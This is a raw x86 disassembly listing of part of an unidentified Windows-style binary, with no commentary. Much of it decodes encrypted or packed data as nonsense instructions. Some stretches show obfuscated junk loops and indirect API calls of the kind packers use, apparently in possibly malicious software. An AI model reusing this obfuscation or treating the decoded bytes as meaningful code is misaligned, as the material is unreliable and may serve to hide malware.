  4069cb:	test   eax,0x3828d1dc
  4069d0:	pushf  
  4069d1:	xchg   ebp,eax
  4069d2:	mul    BYTE PTR [esi]
  4069d4:	xor    edx,DWORD PTR [edx+0x75]
  4069d7:	jmp    0x600581e2
  4069dc:	mov    BYTE PTR [ebx],ah
  4069de:	(bad)  
  4069df:	ss dec esi
  4069e1:	jb     0x406a5b
  4069e3:	mov    esi,0x67434b42
  4069e8:	push   eax
  4069e9:	in     al,0x20
  4069eb:	pop    edx
  4069ec:	iret   
  4069ed:	nop
  4069ee:	inc    esp
  4069ef:	mov    cl,bh
  4069f1:	jp     0x4069d0
  4069f3:	popa   
  4069f4:	retf   0x5391
  4069f7:	mov    cl,0xd7
  4069f9:	jge    0x406a02
  4069fb:	pop    ebp
  4069fc:	aaa    
  4069fd:	and    BYTE PTR [eax-0x24],cl
  406a00:	mov    ecx,0x825eb528
  406a05:	mov    edi,0x393e88c4
  406a0a:	jge    0x406a87
  406a0c:	cli    
  406a0d:	cmp    DWORD PTR [edx],esp
  406a0f:	scas   al,BYTE PTR es:[edi]
  406a10:	(bad)  
  406a11:	mov    ds:0x3b3fa8f6,eax
  406a16:	enter  0x2542,0xe0
  406a1a:	test   DWORD PTR ds:0x7ebfc66e,ebx
  406a20:	mov    al,0x73
  406a22:	stos   BYTE PTR es:[edi],al
  406a23:	mov    esp,0xf6d892ce
  406a28:	xor    BYTE PTR [edi],bl
  406a2a:	mov    ebp,0x50c983b4
  406a2f:	retf   
  406a30:	pushf  
  406a31:	imul   esp,edi,0xa0ccf171
  406a37:	imul   eax,edi,0xd790084a
  406a3d:	jno    0x406a86
  406a3f:	or     al,0x78
  406a42:	out    0xb7,al
  406a44:	in     eax,0x82
  406a46:	mov    dl,BYTE PTR [ecx+0x43f7bfc1]
  406a4c:	(bad)  
  406a4d:	into   
  406a4e:	pop    ds
  406a4f:	fimul  WORD PTR ds:0xd9b34d33
  406a55:	or     DWORD PTR [esi+edx*4],ecx
  406a58:	mov    ds:0xa698bcf3,eax
  406a5d:	int    0x45
  406a5f:	ins    BYTE PTR es:[edi],dx
  406a60:	out    dx,al
  406a61:	cs or  al,0x21
  406a64:	pop    es
  406a65:	out    0xfd,eax
  406a67:	or     BYTE PTR [edx],dh
  406a69:	mov    ds,WORD PTR [ebp-0x43]
  406a6c:	jae    0x4069ef
  406a6e:	fidivr WORD PTR [ebp-0x3c]
  406a71:	cwde   
  406a72:	inc    BYTE PTR [ebx+0x78408b63]
  406a78:	mov    DWORD PTR [ebp+0xc],eax
  406a7b:	mov    eax,DWORD PTR [ebp-0x4]
  406a7e:	mov    esi,DWORD PTR [ebp-0x8]
  406a81:	xor    eax,edx
  406a83:	xor    esi,edx
  406a85:	add    eax,ecx
  406a87:	add    esi,ecx
  406a89:	imul   eax,esi
  406a8c:	jmp    0x406c05
  406a91:	xorps  xmm5,XMMWORD PTR [edi]
  406a94:	lds    esp,FWORD PTR [edi+0x5d]
  406a97:	in     eax,0x6d
  406a99:	bound  esi,QWORD PTR [esi]
  406a9b:	rcr    DWORD PTR [ebx+0x6c],0x69
  406a9f:	jle    0x406a94
  406aa1:	add    ebp,DWORD PTR ds:0x7fd87c7c
  406aa7:	jl     0x406b25
  406aa9:	sub    eax,0x5e27b06f
  406aae:	fwait
  406aaf:	pop    ecx
  406ab0:	xchg   esp,eax
  406ab1:	jne    0x406acb
  406ab3:	ret    
  406ab4:	retf   0x527b
  406ab7:	into   
  406ab8:	jnp    0x406a99
  406aba:	sbb    BYTE PTR [ebp-0x73],dh
  406abd:	sar    dl,0x76
  406ac0:	bound  edi,QWORD PTR [edi+0x58]
  406ac3:	add    bh,dl
  406ac5:	inc    eax
  406ac6:	pop    esi
  406ac7:	pop    ebx
  406ac8:	jbe    0x406ab2
  406aca:	fimul  WORD PTR [edx+ecx*8-0x292965d5]
  406ad1:	dec    edi
  406ad2:	popf   
  406ad3:	movups xmm6,XMMWORD PTR [esi]
  406ad6:	jae    0x406b27
  406ad8:	(bad)  
  406ad9:	xor    ch,BYTE PTR [ecx]
  406adb:	and    BYTE PTR [ecx],al
  406add:	(bad)  
  406ade:	cld    
  406adf:	test   al,0x95
  406ae1:	call   0x1233ee56
  406ae6:	mov    ebp,0x24a60273
  406aeb:	dec    ebp
  406aec:	and    al,0xa4
  406aee:	and    al,0xd0
  406af0:	cmp    BYTE PTR [eax+0x16],cl
  406af3:	(bad)  
  406af4:	rcl    dh,cl
  406af6:	test   DWORD PTR [ebx],0x7e90237e
  406afc:	adc    DWORD PTR [edi-0x59],ebp
  406aff:	leave  
  406b00:	stos   BYTE PTR es:[edi],al
  406b01:	out    dx,al
  406b02:	push   edi
  406b03:	scas   eax,DWORD PTR es:[edi]
  406b04:	ret    
  406b05:	jbe    0x406a8a
  406b07:	sub    al,0x98
  406b09:	test   eax,0xb9c31908
  406b0e:	dec    esi
  406b0f:	aas    
  406b10:	fprem  
  406b12:	(bad)  
  406b13:	outs   dx,BYTE PTR ds:[esi]
  406b14:	loopne 0x406b22
  406b16:	lods   eax,DWORD PTR ds:[esi]
  406b17:	or     cl,ch
  406b19:	mov    esi,0x6c77231f
  406b1e:	xor    al,0xb2
  406b20:	shr    DWORD PTR [edx],cl
  406b22:	push   0x973b1e86
  406b27:	test   eax,0x7ccf0fd0
  406b2c:	and    dh,BYTE PTR [edi-0x4c5a69fc]
  406b32:	mov    ebp,0xe640742d
  406b37:	into   
  406b38:	push   0x479a7da0
  406b3d:	fwait
  406b3e:	mov    esp,0x60b06478
  406b43:	inc    eax
  406b44:	scas   eax,DWORD PTR es:[edi]
  406b45:	push   edx
  406b46:	mov    DWORD PTR [ebp+eiz*2+0x6742b54d],esi
  406b4d:	mov    ah,BYTE PTR [ecx+0x5d8eff40]
  406b53:	(bad)  
  406b54:	xchg   ebp,eax
  406b55:	xor    al,0x61
  406b57:	mov    al,ds:0x1350f064
  406b5c:	inc    esp
  406b5d:	jns    0x406bbf
  406b5f:	sub    DWORD PTR [edx-0x385e3edb],esp
  406b65:	and    cl,ah
  406b67:	add    al,0x14
  406b69:	xor    ah,ah
  406b6b:	sbb    BYTE PTR [edx+0x428d5111],0xbe
  406b72:	aas    
  406b73:	or     al,0xad
  406b75:	or     DWORD PTR [edi],0xffffff86
  406b78:	lods   al,BYTE PTR ds:[esi]
  406b79:	inc    ebx
  406b7a:	push   ebx
  406b7b:	cld    
  406b7c:	iret   
  406b7d:	out    dx,eax
  406b7e:	lds    edx,FWORD PTR [edx+edx*2+0x3a425759]
  406b85:	and    bp,WORD PTR [edi]
  406b88:	fcom   QWORD PTR [edx-0x39a128f3]
  406b8e:	pop    ss
  406b8f:	push   esp
  406b90:	test   eax,0x6062a9e3
  406b95:	mov    esp,0x680fc1f7
  406b9a:	dec    esi
  406b9b:	mov    bh,0x12
  406b9d:	pop    ds
  406b9e:	cld    
  406b9f:	ins    DWORD PTR es:[edi],dx
  406ba0:	push   0x457b407f
  406ba5:	add    ecx,DWORD PTR [esp+esi*1]
  406ba8:	push   eax
  406ba9:	fs mov ecx,0x4e2af555
  406baf:	pusha  
  406bb0:	enter  0xea01,0x12
  406bb4:	ins    BYTE PTR es:[edi],dx
  406bb5:	ret    
  406bb6:	mov    bl,0xaa
  406bb8:	int3   
  406bb9:	jg     0x406b8b
  406bbb:	mov    BYTE PTR [ecx+0x3d],dh
  406bbe:	add    dl,BYTE PTR [eax-0xc]
  406bc1:	mov    al,ds:0xd756b1a6
  406bc6:	js     0x406b61
  406bc8:	retf   
  406bc9:	cs lahf 
  406bcb:	jne    0x406b87
  406bcd:	loop   0x406c1a
  406bcf:	push   ss
  406bd0:	mov    ch,0x36
  406bd2:	pop    ebp
  406bd3:	mov    esp,0xda559240
  406bd8:	ja     0x406bd8
  406bda:	fs in  eax,dx
  406bdc:	mov    al,0xbe
  406bde:	ins    BYTE PTR es:[edi],dx
  406bdf:	popa   
  406be0:	or     ebx,ecx
  406be2:	dec    ebp
  406be3:	push   ds
  406be4:	mov    BYTE PTR [edx+0x8],al
  406be7:	inc    esp
  406be8:	cwde   
  406be9:	outs   dx,DWORD PTR ds:[esi]
  406bea:	inc    eax
  406beb:	mov    dh,0x31
  406bed:	xor    ah,BYTE PTR [esi]
  406bef:	test   al,0x43
  406bf1:	fild   DWORD PTR cs:[ebx+0x50b7c02f]
  406bf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bf9:	push   edi
  406bfa:	jbe    0x406bd1
  406bfc:	lock pop edx
  406bfe:	or     al,0x51
  406c00:	imul   ebp,DWORD PTR [ecx+0x34],0xffffffa2
  406c04:	je     0x406b91
  406c06:	jne    0x406c14
  406c08:	cmp    esi,eax
  406c0a:	mov    eax,DWORD PTR [ebp-0x4]
  406c0d:	je     0x40675d
  406c13:	xor    eax,edx
  406c15:	add    eax,ecx
  406c17:	mov    ecx,DWORD PTR [ebp+0xc]
  406c1a:	jmp    0x406d93
  406c1f:	stos   BYTE PTR es:[edi],al
  406c20:	adc    DWORD PTR [esp+ebp*2],ebp
  406c23:	mov    ebx,0xc2fd6a61
  406c28:	mov    al,ds:0xc8c6d58d
  406c2d:	push   ss
  406c2e:	mov    dl,0xef
  406c30:	sub    al,0x7c
  406c32:	jl     0x406c0c
  406c34:	jg     0x406cb2
  406c36:	jl     0x406cb7
  406c38:	xor    BYTE PTR [eax],al
  406c3a:	ror    DWORD PTR [edx-0x4f116b93],cl
  406c40:	pop    ds
  406c41:	lock call 0x5a60198c
  406c47:	and    esi,DWORD PTR [edx]
  406c49:	pop    ebp
  406c4a:	loop   0x406c34
  406c4c:	rcr    BYTE PTR ds:0xaefecc22,cl
  406c52:	ret    
  406c53:	rcl    BYTE PTR [esi+esi*1+0x66],1
  406c57:	inc    ecx
  406c58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c59:	sti    
  406c5a:	cs pop eax
  406c5c:	nop
  406c5d:	call   0x45db:0x864ead30
  406c64:	xor    eax,0x851329cb
  406c69:	jp     0x406bf7
  406c6b:	jno    0x406c95
  406c6d:	and    bl,BYTE PTR [eax]
  406c6f:	sbb    DWORD PTR [ebp+edi*1-0x33],0x33
  406c74:	popf   
  406c75:	and    al,0xf2
  406c77:	jp     0x406cf5
  406c79:	push   ecx
  406c7a:	push   es
  406c7b:	jns    0x406c00
  406c7d:	mov    bh,0x24
  406c7f:	push   es
  406c80:	xchg   ebp,eax
  406c81:	repz fwait
  406c83:	fstp   TBYTE PTR ds:[ecx+0x68872108]
  406c8a:	xchg   BYTE PTR [edx-0x72f8e4ba],cl
  406c90:	dec    esp
  406c91:	inc    esi
  406c92:	push   0x79
  406c94:	bound  eax,QWORD PTR [esi+edi*8]
  406c97:	daa    
  406c98:	xor    ebp,esp
  406c9a:	pop    ss
  406c9b:	into   
  406c9c:	and    di,WORD PTR cs:[ecx-0x1eccf914]
  406ca4:	mov    bl,0x92
  406ca7:	(bad)  
  406ca8:	in     eax,dx
  406ca9:	fs or  eax,0xd5bc43bd
  406caf:	sbb    al,0x96
  406cb1:	(bad)  
  406cb2:	jge    0x406cf8
  406cb4:	les    ebx,FWORD PTR [eax-0x2ba9b986]
  406cba:	and    ah,ah
  406cbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cbd:	mov    ah,BYTE PTR [edi]
  406cbf:	daa    
  406cc0:	cmp    eax,0xc1cd7b6
  406cc5:	push   esp
  406cc6:	cmp    BYTE PTR [edi-0x51],0x2b
  406cca:	sub    ch,BYTE PTR [edi+0x15259f94]
  406cd0:	sqrtps xmm1,XMMWORD PTR ds:0xee3aacfe
  406cd7:	mov    ds:0x4e8b2115,al
  406cdc:	retf   0xd2e9
  406cdf:	inc    ecx
  406ce0:	push   cs
  406ce1:	push   es
  406ce2:	mov    al,0x9a
  406ce4:	mov    ds:0xe43c3119,al
  406ce9:	mov    bh,0x79
  406ceb:	lock pop DWORD PTR [ebx]
  406cee:	in     eax,0x15
  406cf0:	mov    ebp,0x90322158
  406cf5:	stos   BYTE PTR es:[edi],al
  406cf6:	jge    0x406d36
  406cf8:	pop    ebx
  406cf9:	add    al,0x55
  406cfb:	shl    DWORD PTR [ebx],0x42
  406cfe:	(bad)  
  406cff:	sub    BYTE PTR [esi-0x61],al
  406d02:	inc    edx
  406d03:	rcl    DWORD PTR [esi],0xff
  406d06:	xlat   BYTE PTR ds:[ebx]
  406d07:	aad    0x9c
  406d09:	jnp    0x406d71
  406d0b:	shr    BYTE PTR [ebp+ebx*8+0x62],cl
  406d0f:	das    
  406d10:	xchg   edi,eax
  406d11:	aam    0x9c
  406d13:	cli    
  406d14:	mov    esp,0xb2272673
  406d19:	mov    dl,0xa8
  406d1b:	jo     0x406d3f
  406d1d:	fwait
  406d1e:	add    eax,0xb4baf9c7
  406d23:	push   edx
  406d24:	inc    esp
  406d25:	sti    
  406d26:	mov    esp,0xf6c76547
  406d2b:	ficomp WORD PTR [eax]
  406d2d:	sbb    DWORD PTR [esi],ebp
  406d2f:	cs jmp 0x7560:0xa481b1c9
  406d37:	mov    esp,DWORD PTR [edx+0x25a3ea94]
  406d3d:	sbb    dl,0x8d
  406d40:	ret    
  406d41:	or     ah,BYTE PTR [ebx-0x43]
  406d44:	loopne 0x406d16
  406d46:	and    DWORD PTR fs:[edi],esi
  406d49:	xlat   BYTE PTR ds:[ebx]
  406d4a:	addr16 inc ebx
  406d4c:	mov    dh,0xdc
  406d4e:	mov    esi,0x45e62655
  406d53:	xor    cl,bh
  406d55:	adc    eax,0x6655484c
  406d5a:	or     al,0x6a
  406d5c:	xor    eax,0x38028b7c
  406d61:	sbb    DWORD PTR [ecx-0xb],edi
  406d64:	sub    DWORD PTR [esi],ebx
  406d66:	xchg   edx,eax
  406d67:	jmp    0x406d66
  406d69:	dec    esi
  406d6a:	inc    ebp
  406d6b:	stc    
  406d6c:	mov    DWORD PTR [edi-0x51e0c031],eax
  406d72:	es push edx
  406d74:	sbb    ah,dh
  406d76:	call   0x90c71980
  406d7b:	pop    esp
  406d7c:	or     dl,BYTE PTR [edi-0x4164a342]
  406d82:	xchg   esi,eax
  406d83:	cmp    BYTE PTR [esi-0x3e],dh
  406d86:	cmp    BYTE PTR [edx+ecx*8],ah
  406d89:	sbb    BYTE PTR [ecx],dh
  406d8b:	inc    esi
  406d8c:	ffreep st(0)
  406d8e:	repnz cmp ecx,DWORD PTR [edi-0x50f04b0a]
  406d95:	shr    ecx,0x74
  406d98:	add    DWORD PTR [eax],eax
  406d9a:	add    BYTE PTR [edx],dl
  406d9c:	sub    BYTE PTR [ebx+0x126d4d55],dh
  406da2:	imul   edi,DWORD PTR [esi+ebx*4-0x38ae1656],0xffffff97
  406daa:	mov    dl,0x4b
  406dac:	das    
  406dad:	jl     0x406e2b
  406daf:	fdivr  DWORD PTR [edi+0x7c]
  406db2:	jl     0x406d92
  406db4:	shr    DWORD PTR [ebp-0x55b5394f],0xb
  406dbb:	inc    esi
  406dbc:	(bad)  
  406dbd:	pop    edx
  406dbe:	mov    edi,0xaf3e9d7
  406dc3:	inc    ebp
  406dc4:	cmp    BYTE PTR [ecx],cl
  406dc6:	sahf   
  406dc7:	xor    al,0x63
  406dc9:	and    BYTE PTR [edx+0x1],bl
  406dcc:	jle    0x406e26
  406dce:	ficomp WORD PTR ds:0x49322935
  406dd4:	(bad)  
  406dd5:	les    ebp,FWORD PTR [edx+0x2bd8ebb2]
  406ddb:	add    DWORD PTR [edx],0xffffffcc
  406dde:	pushf  
  406ddf:	fisttp QWORD PTR [eax-0x3b]
  406de2:	or     BYTE PTR [ebx],0x9f
  406de5:	(bad)  
  406de6:	pop    esi
  406de7:	call   0xfbe7f85f
  406dec:	mov    ecx,0xd59e8e4
  406df1:	jg     0x406e2c
  406df3:	scas   al,BYTE PTR es:[edi]
  406df4:	popf   
  406df5:	push   0xffffffb2
  406df7:	inc    edi
  406df8:	cli    
  406df9:	cmp    al,0xa1
  406dfb:	aad    0x18
  406dfd:	mov    es,WORD PTR [edx+0x24]
  406e00:	dec    ebx
  406e01:	xchg   esi,eax
  406e02:	mov    esp,0x83bd2951
  406e07:	std    
  406e08:	call   0x92f876e6
  406e0d:	inc    ecx
  406e0e:	sub    eax,0xf5f606cf
  406e13:	mov    dh,0x0
  406e15:	leave  
  406e16:	and    BYTE PTR [ebx-0x2c],bh
  406e19:	pusha  
  406e1a:	dec    esp
  406e1b:	ja     0x406dcb
  406e1d:	popa   
  406e1e:	adc    eax,0x50397fb3
  406e23:	mov    ds:0xfcf00ea1,eax
  406e28:	pop    esi
  406e29:	mov    ecx,0x28ab1700
  406e2e:	in     al,0x47
  406e30:	dec    esi
  406e31:	xchg   edi,eax
  406e32:	lods   eax,DWORD PTR ds:[esi]
  406e33:	jnp    0x406ddc
  406e35:	dec    ebx
  406e36:	dec    esp
  406e37:	xor    al,0xa5
  406e39:	(bad)  
  406e3a:	fild   QWORD PTR [edi]
  406e3c:	pop    ds
  406e3d:	sub    al,0x5f
  406e3f:	jnp    0x406dc7
  406e41:	xor    al,0xb1
  406e43:	push   edx
  406e44:	and    ah,ch
  406e46:	iret   
  406e47:	stos   DWORD PTR es:[edi],eax
  406e48:	sub    ebp,eax
  406e4a:	icebp  
  406e4b:	(bad)  
  406e4c:	cli    
  406e4d:	push   0x2e
  406e4f:	imul   esp,DWORD PTR [ebx-0x4f02bf84],0x915159a3
  406e59:	jle    0x406e54
  406e5b:	mov    cl,0x7c
  406e5d:	mov    bh,0x9b
  406e5f:	(bad)  [ebp-0x6852258c]
  406e65:	mov    eax,0x5463c3b7
  406e6a:	sub    eax,DWORD PTR [edi-0xf]
  406e6d:	add    DWORD PTR [edx],ebx
  406e6f:	sahf   
  406e70:	imul   ecx,DWORD PTR [ebp-0x1c0df918],0xffffffc4
  406e77:	mov    cl,0x86
  406e79:	push   ecx
  406e7a:	push   ecx
  406e7b:	cli    
  406e7c:	pop    es
  406e7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e7e:	nop
  406e7f:	jno    0x406e69
  406e81:	xlat   BYTE PTR ds:[ebx]
  406e82:	test   BYTE PTR [esi],cl
  406e84:	jns    0x406ecf
  406e86:	arpl   WORD PTR [ebp-0x78455727],ax
  406e8c:	mov    ds:0xd94094e0,eax
  406e91:	push   ebp
  406e92:	push   edx
  406e93:	mov    ebp,?
  406e95:	jge    0x406e3a
  406e97:	hlt    
  406e98:	adc    al,BYTE PTR ss:[edi-0x9abf5f9]
  406e9f:	jmp    0xfbf17cce
  406ea4:	imul   DWORD PTR [ecx]
  406ea6:	sub    al,0x40
  406ea8:	fwait
  406ea9:	mov    esi,0xdf739063
  406eae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406eaf:	dec    BYTE PTR [ebx-0x1a4551c9]
  406eb5:	mov    edi,0x96fec257
  406eba:	adc    al,0x2a
  406ebc:	loopne 0x406e69
  406ebe:	and    al,0xdb
  406ec0:	(bad)
  406ec3:	loop   0x406ed7
  406ec5:	mov    ebx,DWORD PTR [eax+0x29]
  406ec8:	and    al,0x8d
  406eca:	rcl    DWORD PTR [ecx+0x7c],0x98
  406ece:	xchg   edx,eax
  406ecf:	and    BYTE PTR [ebx],ah
  406ed1:	addr16 nop
  406ed3:	add    al,0x16
  406ed5:	aam    0xe6
  406ed7:	mov    esp,DWORD PTR [edi]
  406ed9:	sub    bl,al
  406edb:	dec    ebp
  406edc:	jnp    0x406eac
  406ede:	loope  0x406f21
  406ee0:	dec    eax
  406ee1:	icebp  
  406ee2:	mov    ah,0x24
  406ee4:	cmc    
  406ee5:	adc    eax,0x40e7d966
  406eea:	push   0x7b73870b
  406eef:	jno    0x406ed5
  406ef1:	mov    ecx,DWORD PTR [esi-0x57]
  406ef4:	mov    edx,0x47a8a6ab
  406ef9:	lahf   
  406efa:	enter  0xba3d,0xb3
  406efe:	add    eax,0x99b42006
  406f03:	mov    ebp,0xe6683d44
  406f08:	retf   
  406f09:	mov    eax,ds:0xecf53202
  406f0e:	add    al,0x3
  406f10:	inc    ebp
  406f11:	or     BYTE PTR [ecx+0x458b0c45],cl
  406f17:	or     al,0x5e
  406f19:	leave  
  406f1a:	ret    0x8
  406f1d:	push   ebp
  406f1e:	mov    ebp,esp
  406f20:	sub    esp,0x30
  406f23:	xor    eax,0x5695
  406f28:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  406f2f:	mov    DWORD PTR ds:0x4292ad,0x11
  406f39:	cmp    DWORD PTR ds:0x4292ad,0x0
  406f40:	je     0x406f7d
  406f46:	cmp    DWORD PTR ds:0x4292ad,0x1b
  406f4d:	jne    0x406f61
  406f53:	push   0x7d57
  406f58:	push   DWORD PTR [ebp-0xc]
  406f5b:	call   DWORD PTR ds:0x427ac7
  406f61:	mov    ecx,DWORD PTR ds:0x4292ad
  406f67:	dec    ecx
  406f68:	mov    DWORD PTR ds:0x4292ad,ecx
  406f6e:	jmp    0x406f39
  406f73:	xor    DWORD PTR ds:0x427594,0x427d17
  406f7d:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  406f84:	mov    ecx,DWORD PTR [ebp-0x4]
  406f87:	push   ebx
  406f88:	mov    eax,0x7510857
  406f8d:	adc    ebx,DWORD PTR ds:0x4292c5
  406f93:	xor    ecx,eax
  406f95:	and    DWORD PTR ds:0x4292c5,0x0
  406f9f:	jmp    0x406fb1
  406fa4:	mov    ebx,DWORD PTR ds:0x4292c5
  406faa:	inc    ebx
  406fab:	mov    DWORD PTR ds:0x4292c5,ebx
  406fb1:	cmp    DWORD PTR ds:0x4292c5,0x12
  406fb8:	jae    0x407003
  406fbe:	cmp    DWORD PTR ds:0x4292c5,0x4
  406fc5:	jne    0x406fe4
  406fcb:	push   DWORD PTR [ebp-0x18]
  406fce:	push   DWORD PTR [ebp-0x18]
  406fd1:	push   0x4bf1
  406fd6:	push   DWORD PTR [ebp-0x28]
  406fd9:	push   0x78bb
  406fde:	call   DWORD PTR ds:0x427acb
  406fe4:	cmp    DWORD PTR ds:0x4292c5,0x3
  406feb:	jne    0x406ffe
  406ff1:	mov    ebx,DWORD PTR ds:0x4292c5
  406ff7:	inc    ebx
  406ff8:	mov    DWORD PTR ds:0x4292c5,ebx
  406ffe:	jmp    0x406fa4
  407003:	mov    ebx,0x32729e
  407008:	add    DWORD PTR ds:0x427cfb,0x42c892
  407012:	add    ecx,ebx
  407014:	mov    DWORD PTR [ebp-0x1c],ecx
  407017:	neg    DWORD PTR ds:0x427d0f
  40701d:	mov    ecx,DWORD PTR [ebp+0x14]
  407020:	sub    DWORD PTR ds:0x427cf7,0x56dd
  40702a:	push   esi
  40702b:	push   edi
  40702c:	add    DWORD PTR ds:0x427d0f,0x42c89a
  407036:	test   ecx,ecx
  407038:	mov    DWORD PTR ds:0x4292c5,0x64aa
  407042:	je     0x407316
  407048:	and    DWORD PTR ds:0x42c882,0x0
  407052:	mov    esi,DWORD PTR ds:0x42c882
  407058:	inc    esi
  407059:	mov    DWORD PTR ds:0x42c882,esi
  40705f:	cmp    DWORD PTR ds:0x42c882,0x6
  407066:	jne    0x40707e
  40706c:	push   DWORD PTR [ebp-0x24]
  40706f:	push   DWORD PTR [ebp-0x18]
  407072:	push   DWORD PTR [ebp-0x14]
  407075:	push   DWORD PTR [ebp-0x28]
  407078:	call   DWORD PTR ds:0x427c6f
  40707e:	cmp    DWORD PTR ds:0x42c882,0x5
  407085:	jne    0x40709a
  40708b:	xor    esi,esi
  40708d:	or     esi,DWORD PTR ds:0x42c882
  407093:	inc    esi
  407094:	mov    DWORD PTR ds:0x42c882,esi
  40709a:	cmp    DWORD PTR ds:0x42c882,0x14
  4070a1:	jb     0x407052
  4070a7:	mov    ecx,DWORD PTR [ebp+0x14]
  4070aa:	mov    DWORD PTR ds:0x4292b1,0x1a
  4070b4:	cmp    DWORD PTR ds:0x4292b1,0x0
  4070bb:	je     0x407188
  4070c1:	cmp    DWORD PTR ds:0x4292b1,0xc
  4070c8:	jne    0x4070de
  4070ce:	push   0x42783c
  4070d3:	push   0x4275b4
  4070d8:	call   DWORD PTR ds:0x4279f3
  4070de:	cmp    DWORD PTR ds:0x4292b1,0xd
  4070e5:	jne    0x4070fa
  4070eb:	xor    edi,edi
  4070ed:	xor    edi,DWORD PTR ds:0x4292b1
  4070f3:	dec    edi
  4070f4:	mov    DWORD PTR ds:0x4292b1,edi
  4070fa:	xor    edi,edi
  4070fc:	or     edi,DWORD PTR ds:0x4292b1
  407102:	dec    edi
  407103:	mov    DWORD PTR ds:0x4292b1,edi
  407109:	jmp    0x4070b4
  40710e:	and    DWORD PTR ds:0x4292b5,0x0
  407118:	jmp    0x40712a
  40711d:	mov    edi,DWORD PTR ds:0x4292b5
  407123:	inc    edi
  407124:	mov    DWORD PTR ds:0x4292b5,edi
  40712a:	cmp    DWORD PTR ds:0x4292b5,0x16
  407131:	jae    0x407188
  407137:	cmp    DWORD PTR ds:0x4292b5,0x4
  40713e:	jne    0x407169
  407144:	push   DWORD PTR [ebp-0x28]
  407147:	push   0x1a81
  40714c:	push   0x427d07
  407151:	push   0x8e69
  407156:	push   0x489c
  40715b:	push   0x5b7d
  407160:	push   DWORD PTR [ebp-0x10]
  407163:	call   DWORD PTR ds:0x427c73
  407169:	cmp    DWORD PTR ds:0x4292b5,0x3
  407170:	jne    0x407183
  407176:	mov    edi,DWORD PTR ds:0x4292b5
  40717c:	inc    edi
  40717d:	mov    DWORD PTR ds:0x4292b5,edi
  407183:	jmp    0x40711d
  407188:	mov    ecx,DWORD PTR [ecx]
  40718a:	jmp    0x407313
  40718f:	jne    0x40718d
  407191:	mov    cl,0x3f
  407193:	mov    ch,0x31
  407195:	cmc    
  407196:	mov    dl,0xc1
  407198:	pop    edx
  407199:	sub    DWORD PTR [esi-0xb5e8ce7],esp
  40719f:	pop    ss
  4071a0:	and    DWORD PTR [esp+edi*2-0x18],edi
  4071a4:	jg     0x407222
  4071a6:	jl     0x407165
  4071a8:	pop    ds
  4071a9:	pop    ds
  4071aa:	gs jp  0x407165
  4071ad:	inc    ebp
  4071ae:	pop    ebx
  4071af:	cwde   
  4071b0:	sbb    ebx,DWORD PTR [ecx]
  4071b2:	dec    ecx
  4071b3:	jmp    0xade8:0x325dc4e8
  4071ba:	cld    
  4071bb:	sbb    ax,0x1647
  4071bf:	clc    
  4071c0:	cwde   
  4071c1:	push   esi
  4071c2:	loop   0x407235
  4071c4:	inc    ecx
  4071c5:	ss ret 0x3151
  4071c9:	inc    eax
  4071ca:	jae    0x407172
  4071cc:	push   esp
  4071cd:	jl     0x4071c2
  4071cf:	jmp    0xa8e:0x561a0045
  4071d6:	and    DWORD PTR [ecx-0x7a],esp
  4071d9:	sbb    DWORD PTR [edx+edi*2+0x7],0xffffff84
  4071de:	xor    DWORD PTR [ebp+0x47c4c781],ebp
  4071e4:	pop    esi
  4071e5:	repz adc bh,bh
  4071e8:	sub    eax,0x4112c637
  4071ed:	xchg   edi,eax
  4071ee:	imul   ecx,DWORD PTR [ecx-0x6a],0xb043257d
  4071f5:	out    dx,eax
  4071f6:	pop    eax
  4071f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071f8:	fdivrp st(6),st
  4071fa:	push   es
  4071fb:	mov    cl,0x63
  4071fd:	mov    esi,0x266bc03c
  407202:	js     0x40721b
  407204:	jmp    0x40724d
  407206:	mov    al,dl
  407208:	pop    es
  407209:	mov    WORD PTR [ebp-0x58],?
  40720c:	xor    DWORD PTR ds:0x2aefef1d,0xffffff8a
  407213:	in     eax,dx
  407214:	and    al,0xd4
  407216:	loope  0x4071ad
  407218:	call   0x2d02c2de
  40721d:	sub    eax,0x7fd6f6a0
  407222:	call   0xca08848
  407227:	in     eax,dx
  407228:	imul   ebp,DWORD PTR [ecx+0x1c],0xffffffcf
  40722c:	icebp  
  40722d:	iret   
  40722e:	ds jno 0x407267
  407231:	(bad)  
  407232:	jmp    0x2973:0xcbd2aec8
  407239:	dec    esp
  40723a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40723b:	mov    al,0xb6
  40723d:	pop    edx
  40723e:	or     al,BYTE PTR [ecx+ebx*4]
  407241:	adc    eax,DWORD PTR [eax-0x1a1ede38]
  407247:	pop    DWORD PTR [ebp-0x4c5801cd]
  40724d:	arpl   WORD PTR [eax],bx
  40724f:	in     eax,0x55
  407251:	nop
  407252:	rcl    bh,1
  407254:	xchg   edi,eax
  407255:	sub    BYTE PTR [ecx-0x5784a566],ah
  40725b:	and    esi,DWORD PTR [eax-0x2b]
  40725e:	jnp    0x4071f9
  407260:	pusha  
  407261:	sbb    DWORD PTR ds:0x5b342ce6,esi
  407267:	hlt    
  407268:	mov    dh,0x2d
  40726a:	test   al,0xd
  40726c:	addr16 mov ds:0x3622,al
  407270:	cmc    
  407271:	mov    eax,ds:0xd951041
  407276:	xchg   ebp,eax
  407277:	jl     0x4072e1
  407279:	rol    BYTE PTR [edx],1
  40727b:	mov    eax,0x5d77bda4
  407280:	inc    esp
  407281:	jp     0x40725e
  407283:	xor    DWORD PTR [esi-0x4aa8583b],ebx
  407289:	jge    0x407210
  40728b:	mov    esi,0x3ca6a291
  407290:	outs   dx,BYTE PTR ds:[esi]
  407291:	jmp    0x155826d8
  407296:	inc    ebp
  407297:	aam    0xd9
  407299:	sbb    eax,esi
  40729b:	imul   bh
  40729d:	sbb    DWORD PTR [ebx-0x45],edi
  4072a0:	push   ecx
  4072a1:	add    BYTE PTR [esi],ah
  4072a3:	mov    ebx,0xbfc7e8f6
  4072a8:	sbb    al,ah
  4072aa:	pushf  
  4072ab:	nop
  4072ac:	mov    esi,DWORD PTR ds:0x35ed595a
  4072b2:	jnp    0x4072fe
  4072b4:	ret    0xa9c1
  4072b7:	dec    ecx
  4072b8:	push   ebx
